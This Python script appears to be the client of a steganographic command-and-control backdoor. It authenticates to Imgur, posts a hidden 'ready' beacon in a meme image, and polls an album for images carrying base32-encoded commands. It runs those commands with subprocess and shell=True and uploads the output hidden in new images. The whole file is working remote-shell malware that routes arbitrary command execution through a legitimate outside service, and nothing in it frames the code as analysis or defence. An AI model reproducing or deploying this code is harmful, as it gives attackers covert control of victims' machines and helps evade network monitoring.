from imgurpython import ImgurClient
import StegoText
import ast, os, time, shlex, subprocess, base64, random, sys

def get_input(string):
    try:
        return raw_input(string)
    except:
        return input(string)

def authenticate():
    client_id = '<YOUR CLIENT ID>'
    client_secret = '<YOUR CLIENT SECRET>'

    client = ImgurClient(client_id, client_secret)
    authorization_url = client.get_auth_url('pin')

    print("Go to the following URL: {0}".format(authorization_url))
    pin = get_input("Enter pin code: ")

    credentials = client.authorize(pin, 'pin')
    client.set_user_auth(credentials['access_token'], credentials['refresh_token'])

    return client


client_uuid = "test_client_1"

client = authenticate()
a = client.get_account_albums("<YOUR IMGUR USERNAME>")

imgs = client.get_album_images(a[0].id)
last_message_datetime = imgs[-1].datetime

steg_path = StegoText.hide_message(random.choice(client.default_memes()).link,
                                   "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'ready'}",
                                   "Imgur1.png",True)
uploaded = client.upload_from_path(steg_path)
client.album_add_images(a[0].id, uploaded['id'])
last_message_datetime = uploaded['datetime']

loop = True
while loop:
    
    time.sleep(5) 
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))
        if client_dict['uuid'] == client_uuid:
            command = base64.b32decode(client_dict['command'])
            
            if command == "quit":
                sys.exit(0)
                
            args = shlex.split(command)
            p = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            p_status = p.wait()

            steg_path = StegoText.hide_message(random.choice(client.default_memes()).link,
                                   "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'response', 'response':'" + str(base64.b32encode(output)) + "'}",
                                   "Imgur1.png", True)
            uploaded = client.upload_from_path(steg_path)
            client.album_add_images(a[0].id, uploaded['id'])
            last_message_datetime = uploaded['datetime']
